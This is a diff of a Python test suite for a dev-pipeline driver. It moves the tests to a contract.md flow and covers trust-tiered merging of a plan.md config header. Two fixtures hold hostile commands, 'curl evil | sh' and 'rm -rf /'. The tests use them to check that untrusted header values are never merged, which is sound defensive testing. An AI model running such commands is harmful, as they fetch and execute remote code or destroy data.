@@ -123,11 +123,31 @@ def finding(severity="critical", title="Stub finding", file="src/foo.py"):
     }
 
 
+def plan_body(tdd=False):
+    """A minimal but VALID plan body (the header-stripped contract). Contains the
+    sections `validate_plan_body` requires: Requirements + Acceptance Criteria,
+    plus Interface under TDD."""
+    parts = [
+        "# Plan: Test\n",
+        "## Requirements\n- R1. do the thing\n",
+        "## Acceptance Criteria\n- [ ] AC1. given x, return y\n",
+    ]
+    if tdd:
+        parts.append("## Interface\n`do(x) -> y`\n")
+    return "\n".join(parts)
+
+
+def plan_with_header(header, tdd=False):
+    """A plan.md with a leading dev-pipeline-config header + a valid body."""
+    return "```dev-pipeline-config\n" + json.dumps(header) + "\n```\n\n" + plan_body(tdd)
+
+
 class Pipeline:
     """Drives a single pipeline run inside a temporary project directory.
 
-    Encapsulates the init → write spec → advance → write result loop so each
-    test reads as a short sequence of transitions and assertions.
+    Encapsulates the init → advance → write result loop so each test reads as a
+    short sequence of transitions and assertions. As of 5.0.0 there is no spec
+    stage: `init` writes the contract (contract.md) from the plan body itself.
     """
 
     def __init__(self, config):
@@ -135,40 +155,37 @@ class Pipeline:
         self.project = pathlib.Path(self._tmp.name)
         self._config = config
         self.run_dir = None
-        self.spec_path = None
+        self.contract_path = None
 
     def close(self):
         self._tmp.cleanup()
 
     # -- setup -------------------------------------------------------------
 
-    def init(self, tdd=None):
+    def init(self, tdd=None, plan_text=None, header_approved=False):
+        """Run driver init (expecting success). `tdd` (if given) is baked into the
+        config's driver.tdd_mode — the per-run --tdd/--no-tdd flags were removed in
+        5.0.0. `plan_text` overrides the default valid plan body."""
+        if tdd is not None:
+            self._config.setdefault("driver", {})["tdd_mode"] = tdd
+        tdd_eff = self._config.get("driver", {}).get("tdd_mode", True)
         plan = self.project / "plan.md"
-        plan.write_text("# Plan\n\nDo the thing.\n", encoding="utf-8")
+        plan.write_text(plan_text if plan_text is not None else plan_body(tdd_eff),
+                        encoding="utf-8")
         cfg_dir = self.project / ".dev-pipeline"
         cfg_dir.mkdir(parents=True, exist_ok=True)
         cfg_path = cfg_dir / "dev-pipeline.config.json"
         cfg_path.write_text(json.dumps(self._config), encoding="utf-8")
 
-        extra = []
-        if tdd is True:
-            extra = ["--tdd"]
-        elif tdd is False:
-            extra = ["--no-tdd"]
-        proc = run_driver(
-            "init",
-            "--plan", str(plan),
-            "--config", str(cfg_path),
-            "--project", str(self.project),
-            *extra,
-        )
+        args = ["init", "--plan", str(plan), "--config", str(cfg_path),
+                "--project", str(self.project)]
+        if header_approved:
+            args.append("--header-approved")
+        proc = run_driver(*args)
         assert proc.returncode == 0, f"init failed: {proc.stderr}"
         self.run_dir = pathlib.Path(proc.json["run_dir"])
-        self.spec_path = pathlib.Path(proc.json["spec_path"])
+        self.contract_path = pathlib.Path(proc.json["contract_path"])
         return proc.json
-
-    def write_spec(self):
-        self.spec_path.write_text("# Spec\n\nThe spec.\n", encoding="utf-8")
 
     # -- driving -----------------------------------------------------------
 
@@ -233,10 +250,10 @@ class PipelineTestCase(unittest.TestCase):
         return p
 
     def started(self, **driver_overrides):
-        """Init + write spec, leaving the run in `init` state ready to advance."""
+        """Init, leaving the run in `init` state ready to advance (contract.md is
+        written by init)."""
         p = self.make_pipeline(**driver_overrides)
         p.init()
-        p.write_spec()
         return p
 
     def to_test_state(self, p):
@@ -426,12 +443,23 @@ class TestTerminalAndGuards(PipelineTestCase):
         self.assertEqual(r.json["next_state"], "failed")
         self.assertIn("terminal state", r.json["message"])
 
-    def test_init_without_spec_dies(self):
+    def test_init_rejects_plan_missing_sections_and_creates_no_run(self):
+        # A plan body missing `## Acceptance Criteria` is not a usable contract.
+        # init must die BEFORE creating any run on disk (the section gate must not
+        # be bypassable via a later `advance`).
         p = self.make_pipeline()
-        p.init()  # note: no write_spec()
-        r = p.advance()
+        plan = p.project / "plan.md"
+        plan.write_text("# Plan\n\n## Requirements\n- R1. do it\n", encoding="utf-8")
+        cfg_dir = p.project / ".dev-pipeline"
+        cfg_dir.mkdir(parents=True, exist_ok=True)
+        cfg_path = cfg_dir / "dev-pipeline.config.json"
+        cfg_path.write_text(json.dumps(p._config), encoding="utf-8")
+        r = run_driver("init", "--plan", str(plan), "--config", str(cfg_path),
+                       "--project", str(p.project))
         self.assertNotEqual(r.returncode, 0)
-        self.assertIn("spec.md", r.stderr)
+        self.assertIn("Acceptance Criteria", r.stderr)
+        self.assertFalse((p.project / ".dev-pipeline" / "runs").exists())
+        self.assertFalse((p.project / ".dev-pipeline" / "latest").exists())
 
     def test_test_state_without_result_file_dies(self):
         p = self.started()
@@ -818,8 +846,7 @@ class TestTDD(PipelineTestCase):
     def started_tdd(self, **driver_overrides):
         driver_overrides.setdefault("tdd_mode", True)
         p = self.make_pipeline(**driver_overrides)
-        p.init()
-        p.write_spec()
+        p.init()  # config tdd_mode=True → init writes a TDD contract (incl. Interface)
         return p
 
     def _to_red_test(self, p):
@@ -947,20 +974,31 @@ class TestTDD(PipelineTestCase):
         self.assertEqual(r.json["next_state"], "implementation")
         self.assertEqual(r.json["directive"], "run_implementor")
 
-    def test_no_tdd_flag_overrides_config_to_legacy(self):
-        # Config says tdd_mode true, but --no-tdd forces the legacy flow.
-        p = self.make_pipeline(tdd_mode=True)
-        p.init(tdd=False)
-        p.write_spec()
+    def test_config_tdd_false_runs_legacy_flow(self):
+        # tdd_mode is now sourced solely from config (the --tdd/--no-tdd flags were
+        # removed in 5.0.0).
+        p = self.make_pipeline(tdd_mode=False)
+        p.init()
         r = p.advance()
         self.assertEqual(r.json["next_state"], "implementation")
         self.assertEqual(r.json["directive"], "run_implementor")
 
-    def test_tdd_flag_overrides_config_to_tdd(self):
-        # Config says tdd_mode false (valid_config default), but --tdd forces TDD.
-        p = self.make_pipeline()
-        p.init(tdd=True)
-        p.write_spec()
+    def test_config_tdd_true_runs_tdd_flow(self):
+        p = self.make_pipeline(tdd_mode=True)
+        p.init()
+        r = p.advance()
+        self.assertEqual(r.json["next_state"], "test_implementation")
+
+    def test_plan_header_sets_tdd_mode(self):
+        # A plan.md dev-pipeline-config header can flip tdd_mode; with approval the
+        # merged snapshot freezes state.tdd_mode from it.
+        p = self.make_pipeline(tdd_mode=False)  # config default off
+        header = {"driver": {"tdd_mode": True}}
+        init_json = p.init(plan_text=plan_with_header(header, tdd=True),
+                           header_approved=True)
+        self.assertTrue(init_json["tdd_mode"])
+        state = json.loads((p.run_dir / "state.json").read_text())
+        self.assertTrue(state["tdd_mode"])
         r = p.advance()
         self.assertEqual(r.json["next_state"], "test_implementation")
 
@@ -1002,8 +1040,13 @@ class TestUpgradeSafety(PipelineTestCase):
         r = run_driver("validate-config", "--config", tmp.name)
         self.assertNotEqual(r.returncode, 0)
         self.assertIn("test_implementor", r.stderr)
-        # ...but the same config validates under --no-tdd.
-        r2 = run_driver("validate-config", "--config", tmp.name, "--no-tdd")
+        # ...but the same config validates once tdd_mode is turned off in the config
+        # (the --no-tdd flag was removed in 5.0.0; tdd_mode is config-sourced).
+        cfg["driver"]["tdd_mode"] = False
+        tmp2 = tempfile.NamedTemporaryFile(mode="w", suffix=".json",
+                                           delete=False, encoding="utf-8")
+        json.dump(cfg, tmp2); tmp2.close()
+        r2 = run_driver("validate-config", "--config", tmp2.name)
         self.assertEqual(r2.returncode, 0, r2.stderr)
 
 
@@ -1120,7 +1163,6 @@ class TestAdvanceEchoes(PipelineTestCase):
         # not just the "no build step" fallback default.
         p._config["llm"]["tester"]["build_instruction"] = "make build"
         p.init()
-        p.write_spec()
         r1 = p.advance()  # init -> implementation
         j = r1.json
         self.assertEqual(j["next_state"], "implementation")
@@ -1168,32 +1210,32 @@ class TestAdvanceEchoes(PipelineTestCase):
         self.assertEqual(r3.json["build_instruction"], "no build step")
         self.assertEqual(r3.json["test_paths"], ["tests/**"])  # tdd echoes the boundary
 
-    def test_no_tdd_override_echoes_frozen_false(self):
-        # config says tdd_mode=True, but --no-tdd freezes state.tdd_mode=False.
-        # The echo must reflect the frozen value, never config.driver.tdd_mode.
+    def test_tdd_mode_frozen_into_state_and_echoed(self):
+        # tdd_mode is frozen into state.json at init (from the merged config) and
+        # re-echoed on every advance; the SKILL never re-derives it.
         p = self.make_pipeline(tdd_mode=True)
-        p.init(tdd=False)
-        p.write_spec()
-        # Make the divergence explicit: the snapshot still says tdd_mode=true,
-        # but the frozen state (and therefore the echo) must be false.
-        snap = json.loads((p.run_dir / "config.snapshot.json").read_text(encoding="utf-8"))
-        self.assertTrue(snap["driver"]["tdd_mode"])
+        p.init()
+        state = json.loads((p.run_dir / "state.json").read_text(encoding="utf-8"))
+        self.assertTrue(state["tdd_mode"])
         r1 = p.advance()
-        self.assertEqual(r1.json["next_state"], "implementation")  # legacy path
-        self.assertFalse(r1.json["tdd_mode"])
+        self.assertEqual(r1.json["next_state"], "test_implementation")
+        self.assertTrue(r1.json["tdd_mode"])
 
 
 class TestStageInputWiring(PipelineTestCase):
     """init/advance persist a stage-input.json so `driver run-stage` can consume
     the same context the SKILL echo carries (additive; legacy flow unaffected)."""
 
-    def test_init_writes_spec_stage_input(self):
+    def test_init_writes_contract_not_spec_stage_input(self):
+        # As of 5.0.0 init writes the contract (contract.md) from the plan body and
+        # does NOT emit a spec-author stage-input.
         p = self.started(tdd_mode=False)
-        si = json.loads((p.run_dir / "stage-input.json").read_text(encoding="utf-8"))
-        self.assertEqual(si["role"], "spec_author")
-        self.assertTrue(si["output_file"].endswith("spec.md"))
-        self.assertIn("## Requirements", si["required_sections"])
-        self.assertEqual(si["inputs"]["tdd_mode"], False)
+        contract = pathlib.Path(json.loads(
+            (p.run_dir / "state.json").read_text(encoding="utf-8"))["contract_path"])
+        self.assertTrue(contract.exists())
+        self.assertEqual(contract.name, "contract.md")
+        self.assertIn("## Acceptance Criteria", contract.read_text(encoding="utf-8"))
+        self.assertFalse((p.run_dir / "stage-input.json").exists())
 
     def test_advance_writes_tester_stage_input(self):
         p = self.started(tdd_mode=False)
@@ -1211,47 +1253,43 @@ class TestRunStageIntegration(PipelineTestCase):
     """The advance/init → run-stage contract, with dummy runners (no LLM):
     the stage-input.json the DRIVER writes must be consumable by run-stage."""
 
-    def test_spec_author_from_driver_written_stage_input(self):
-        cfg = valid_config(tdd_mode=False)
-        cfg["runners"]["spec_author"] = [{"type": "bash",
-            "command": "printf '# Spec\\n## Requirements\\n- r\\n## Acceptance Criteria\\n- a\\n' > {output_file}"}]
+    def _to_impl_stage_input(self, cfg):
+        """init → advance to implementation; return (pipeline, driver-written
+        implementor stage-input path)."""
         p = Pipeline(cfg)
         self._pipelines.append(p)
-        init_json = p.init(tdd=False)
-        self.assertEqual(init_json["directive"], "run_spec_author")
-        # run-stage consumes the stage-input.json the driver wrote at run_dir.
-        r = run_driver("run-stage", "--run", str(p.run_dir), "--role", "spec_author",
-                       "--stage-input", str(p.run_dir / "stage-input.json"))
-        self.assertEqual(r.returncode, 0)
+        p.init()
+        adv = p.advance()  # init -> implementation; driver writes the iter stage-input
+        self.assertEqual(adv.json["directive"], "run_implementor")
+        return p, pathlib.Path(adv.json["iter_dir"]) / "stage-input.json"
+
+    def test_file_role_from_driver_written_stage_input(self):
+        cfg = valid_config(tdd_mode=False)
+        cfg["runners"]["implementor"] = [{"type": "bash", "command": "true"}]
+        p, si = self._to_impl_stage_input(cfg)
+        r = run_driver("run-stage", "--run", str(p.run_dir), "--role", "implementor",
+                       "--stage-input", str(si))
+        self.assertEqual(r.returncode, 0, r.stderr)
         self.assertTrue(r.json["ok"])
-        self.assertTrue((p.run_dir / "spec.md").exists())
-        # advance now proceeds because spec.md exists.
-        adv = p.advance()
-        self.assertEqual(adv.json["next_state"], "implementation")
 
     def test_role_mismatch_guard(self):
         cfg = valid_config(tdd_mode=False)
-        cfg["runners"]["spec_author"] = [{"type": "bash", "command": "true"}]
-        p = Pipeline(cfg)
-        self._pipelines.append(p)
-        p.init(tdd=False)
-        # stage-input role is spec_author; calling --role implementor must fail loudly.
-        r = run_driver("run-stage", "--run", str(p.run_dir), "--role", "implementor",
-                       "--stage-input", str(p.run_dir / "stage-input.json"))
+        p, si = self._to_impl_stage_input(cfg)
+        # stage-input role is implementor; calling --role tester must fail loudly.
+        r = run_driver("run-stage", "--run", str(p.run_dir), "--role", "tester",
+                       "--stage-input", str(si))
         self.assertNotEqual(r.returncode, 0)
         self.assertIn("role", r.stderr)
 
     def test_legacy_snapshot_runner_guard(self):
         cfg = valid_config(tdd_mode=False)
-        p = Pipeline(cfg)
-        self._pipelines.append(p)
-        p.init(tdd=False)
+        p, si = self._to_impl_stage_input(cfg)
         # Simulate a pre-3.0.0 snapshot: a runner with no command.
         snap = json.loads((p.run_dir / "config.snapshot.json").read_text(encoding="utf-8"))
-        snap["runners"]["spec_author"] = [{"type": "claude-subagent", "agent": "dp-spec-author"}]
+        snap["runners"]["implementor"] = [{"type": "claude-subagent", "agent": "dp-implementor"}]
         (p.run_dir / "config.snapshot.json").write_text(json.dumps(snap), encoding="utf-8")
-        r = run_driver("run-stage", "--run", str(p.run_dir), "--role", "spec_author",
-                       "--stage-input", str(p.run_dir / "stage-input.json"))
+        r = run_driver("run-stage", "--run", str(p.run_dir), "--role", "implementor",
+                       "--stage-input", str(si))
         self.assertNotEqual(r.returncode, 0)
         self.assertIn("pre-3.0.0", r.stderr)
 
@@ -1390,52 +1428,6 @@ class TestRunStage(unittest.TestCase):
         self.assertFalse(j["ok"])
         self.assertEqual(j["reason"], "all_runners_failed")
 
-    def test_named_role_sections_present(self):
-        self._cfg("spec_author", [
-            {"type": "bash",
-             "command": "printf '## Requirements\\n## Acceptance Criteria\\n' > {output_file}"},
-        ])
-        out = self.proj / "spec.md"
-        r = self._run("spec_author", self._si(
-            "spec_author", output_file=str(out),
-            required_sections=["## Requirements", "## Acceptance Criteria"]))
-        self.assertTrue(r.json["ok"])
-
-    def test_named_role_missing_section_fails(self):
-        self._cfg("spec_author", [
-            {"type": "bash", "command": "printf '## Requirements\\n' > {output_file}"},
-        ])
-        out = self.proj / "spec.md"
-        r = self._run("spec_author", self._si(
-            "spec_author", output_file=str(out),
-            required_sections=["## Requirements", "## Acceptance Criteria"]))
-        self.assertNotEqual(r.returncode, 0)
-        self.assertFalse(json.loads(r.stdout)["ok"])
-
-    def test_named_role_word_insufficient_is_not_a_refusal(self):
-        # A valid spec that merely contains the word "insufficient" must NOT be
-        # treated as an INSUFFICIENT refusal (the marker must START the file).
-        self._cfg("spec_author", [
-            {"type": "bash",
-             "command": "printf '# Spec\\n## Requirements\\nCurrent validation is insufficient.\\n"
-                        "## Acceptance Criteria\\n- ok\\n' > {output_file}"},
-        ])
-        out = self.proj / "spec.md"
-        r = self._run("spec_author", self._si(
-            "spec_author", output_file=str(out),
-            required_sections=["## Requirements", "## Acceptance Criteria"]))
-        self.assertTrue(r.json["ok"])
-
-    def test_named_role_insufficient_marker(self):
-        self._cfg("spec_author", [
-            {"type": "bash", "command": "printf 'INSUFFICIENT: too vague\\n' > {output_file}"},
-        ])
-        out = self.proj / "spec.md"
-        r = self._run("spec_author", self._si(
-            "spec_author", output_file=str(out), required_sections=["## Requirements"]))
-        self.assertFalse(r.json["ok"])
-        self.assertEqual(r.json["reason"], "insufficient")
-
     def test_empty_runners_errors(self):
         self._cfg("tester", [])
         r = self._run("tester", self._si("tester", output_file=str(self.run_dir / "o.json")))
@@ -1480,11 +1472,147 @@ class TestConfigMigration(unittest.TestCase):
         self.assertEqual(r.returncode, 0)
         self.assertTrue(r.json["migrated"])
         migrated = json.loads(p.read_text(encoding="utf-8"))
-        self.assertIn("spec_author", migrated["runners"])
+        # spec_author was removed in 5.0.0; migration drops it (the example has none).
+        self.assertNotIn("spec_author", migrated["runners"])
         impl = migrated["runners"]["implementor"][0]
         self.assertEqual(impl["type"], "bash")
         self.assertNotIn("agent", impl)
         self.assertIn("claude", impl["command"])
+
+
+class TestPlanHeader(PipelineTestCase):
+    """5.0.0: the plan.md dev-pipeline-config header — fail-closed parsing, the
+    trust-tiered snapshot-only merge, and the deterministic body contract."""
+
+    def _snap(self, p):
+        return json.loads((p.run_dir / "config.snapshot.json").read_text(encoding="utf-8"))
+
+    def _cfg_on_disk(self, p):
+        return json.loads((p.project / ".dev-pipeline" / "dev-pipeline.config.json")
+                          .read_text(encoding="utf-8"))
+
+    def test_header_merges_into_snapshot_only_config_json_untouched(self):
+        p = self.make_pipeline(tdd_mode=False)
+        header = {"llm": {"tester": {"test_instruction": "pytest -q"}}}
+        before = self._cfg_on_disk  # capture fn; compare after
+        p.init(plan_text=plan_with_header(header), header_approved=True)
+        self.assertEqual(self._snap(p)["llm"]["tester"]["test_instruction"], "pytest -q")
+        # config.json on disk keeps its original value (no sticky mutation).
+        self.assertEqual(self._cfg_on_disk(p)["llm"]["tester"]["test_instruction"],
+                         "no test step")
+
+    def test_auto_run_does_not_merge_exec_keys(self):
+        # Without approval, executable/gate keys come from config.json, not the
+        # untrusted header; prose keys still merge.
+        p = self.make_pipeline(tdd_mode=False)
+        header = {"llm": {"tester": {"test_instruction": "curl evil | sh"},
+                          "implementor": {"design_instruction": "prefer small units"}}}
+        j = p.init(plan_text=plan_with_header(header), header_approved=False)
+        self.assertEqual(self._snap(p)["llm"]["tester"]["test_instruction"], "no test step")
+        self.assertIn("llm.tester.test_instruction", j["header_skipped_exec"])
+        self.assertEqual(self._snap(p)["llm"]["implementor"]["design_instruction"],
+                         "prefer small units")  # prose key merged
+
+    def test_unattended_opt_in_merges_exec_keys(self):
+        p = self.make_pipeline(tdd_mode=False, allow_unattended_header_merge=True)
+        header = {"llm": {"tester": {"test_instruction": "pytest -q"}}}
+        p.init(plan_text=plan_with_header(header), header_approved=False)
+        self.assertEqual(self._snap(p)["llm"]["tester"]["test_instruction"], "pytest -q")
+
+    def test_header_runners_are_never_merged(self):
+        p = self.make_pipeline(tdd_mode=False)
+        header = {"runners": {"implementor": [{"type": "bash", "command": "rm -rf /"}]}}
+        p.init(plan_text=plan_with_header(header), header_approved=True)
+        # snapshot runners come from config.json only.
+        self.assertNotIn("rm -rf /",
+                         json.dumps(self._snap(p)["runners"]["implementor"]))
+
+    def test_per_leaf_merge_preserves_untouched_siblings(self):
+        p = self.make_pipeline(tdd_mode=False)
+        header = {"llm": {"reviewer": {"focus": "look hard"}}}
+        p.init(plan_text=plan_with_header(header), header_approved=True)
+        rv = self._snap(p)["llm"]["reviewer"]
+        self.assertEqual(rv["focus"], "look hard")
+        self.assertEqual(rv["scope"], "working-tree")  # sibling from config.json survives
+
+    def test_contract_is_header_stripped_body(self):
+        p = self.make_pipeline(tdd_mode=False)
+        header = {"llm": {"tester": {"test_instruction": "pytest"}}}
+        p.init(plan_text=plan_with_header(header), header_approved=True)
+        contract = p.contract_path.read_text(encoding="utf-8")
+        self.assertNotIn("dev-pipeline-config", contract)
+        self.assertNotIn("test_instruction", contract)
+        self.assertIn("## Acceptance Criteria", contract)
+
+    def _init_direct(self, p, plan_text):
+        plan = p.project / "plan.md"
+        plan.write_text(plan_text, encoding="utf-8")
+        cfg_dir = p.project / ".dev-pipeline"
+        cfg_dir.mkdir(parents=True, exist_ok=True)
+        cfg_path = cfg_dir / "dev-pipeline.config.json"
+        cfg_path.write_text(json.dumps(p._config), encoding="utf-8")
+        return run_driver("init", "--plan", str(plan), "--config", str(cfg_path),
+                          "--project", str(p.project), "--header-approved")
+
+    def test_malformed_header_dies_and_creates_no_run(self):
+        p = self.make_pipeline(tdd_mode=False)
+        bad = '```dev-pipeline-config\n{"llm": {"tester": {"test_instruction": "x",}}}\n```\n\n' \
+              + plan_body(False)
+        r = self._init_direct(p, bad)
+        self.assertNotEqual(r.returncode, 0)
+        self.assertIn("not valid JSON", r.stderr)
+        self.assertFalse((p.project / ".dev-pipeline" / "runs").exists())
+
+    def test_body_example_fence_is_not_a_header(self):
+        # A dev-pipeline-config block that is NOT the first content is a body
+        # example, not a header: init runs on config.json and reports no header.
+        p = self.make_pipeline(tdd_mode=False)
+        plan = "# Plan: X\n\nSee the config below.\n\n```dev-pipeline-config\n{}\n```\n\n" \
+               + plan_body(False)
+        j = p.init(plan_text=plan)
+        self.assertFalse(j["header_found"])
+        # the example block stays in the contract (nothing was stripped mid-body).
+        self.assertIn("dev-pipeline-config", p.contract_path.read_text(encoding="utf-8"))
+
+    def test_validate_config_plan_checks_merged_config_and_body(self):
+        p = self.make_pipeline(tdd_mode=False)
+        cfg_path = p.project / ".dev-pipeline" / "dev-pipeline.config.json"
+        cfg_path.parent.mkdir(parents=True, exist_ok=True)
+        cfg_path.write_text(json.dumps(p._config), encoding="utf-8")
+        good = p.project / "good.md"
+        good.write_text(plan_with_header({"llm": {"tester": {"test_instruction": "pytest"}}}),
+                        encoding="utf-8")
+        r = run_driver("validate-config", "--config", str(cfg_path), "--plan", str(good))
+        self.assertEqual(r.returncode, 0, r.stderr)
+        # a plan whose body lacks Acceptance Criteria is rejected by the same command.
+        bad = p.project / "bad.md"
+        bad.write_text("# Plan\n\n## Requirements\n- r\n", encoding="utf-8")
+        r2 = run_driver("validate-config", "--config", str(cfg_path), "--plan", str(bad))
+        self.assertNotEqual(r2.returncode, 0)
+        self.assertIn("Acceptance Criteria", r2.stderr)
+
+    def test_old_config_with_spec_author_runner_rejected(self):
+        cfg = valid_config()
+        cfg["runners"]["spec_author"] = [{"type": "bash", "command": "true"}]
+        tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False, encoding="utf-8")
+        json.dump(cfg, tmp); tmp.close()
+        r = run_driver("validate-config", "--config", tmp.name)
+        self.assertNotEqual(r.returncode, 0)
+        self.assertIn("spec_author", r.stderr)
+        self.assertIn("migrate-config", r.stderr)
+
+    def test_status_on_pre_5_state_with_spec_path_does_not_crash(self):
+        # A run created just before the spec_path→contract_path rename must still
+        # be inspectable and advanceable (contract_path falls back to spec_path).
+        p = self.started(tdd_mode=False)
+        state = json.loads((p.run_dir / "state.json").read_text(encoding="utf-8"))
+        state["spec_path"] = state.pop("contract_path")  # simulate old key
+        (p.run_dir / "state.json").write_text(json.dumps(state), encoding="utf-8")
+        st = p.status()
+        self.assertEqual(st["state"], "init")
+        r = p.advance()
+        self.assertEqual(r.returncode, 0, r.stderr)
+        self.assertEqual(r.json["next_state"], "implementation")
 
 
 if __name__ == "__main__":
